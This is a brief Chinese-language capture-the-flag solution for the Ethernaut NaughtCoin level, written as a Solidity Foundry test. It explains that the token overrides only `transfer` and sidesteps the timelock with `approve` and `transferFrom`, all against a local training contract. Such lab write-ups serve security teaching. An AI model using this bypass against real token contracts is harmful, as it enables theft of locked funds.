ERC20 有两种转移代币的方法，本合约只重载了 `transfer`，使用 `approve` 和 `transferFrom` 转移代币即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        address payable tempUser = utilities.getNextUserAddress();

        uint256 balance = level.balanceOf(player);
        level.approve(player, balance);
        level.transferFrom(player, tempUser, balance);

        vm.stopPrank();
    }
}
```

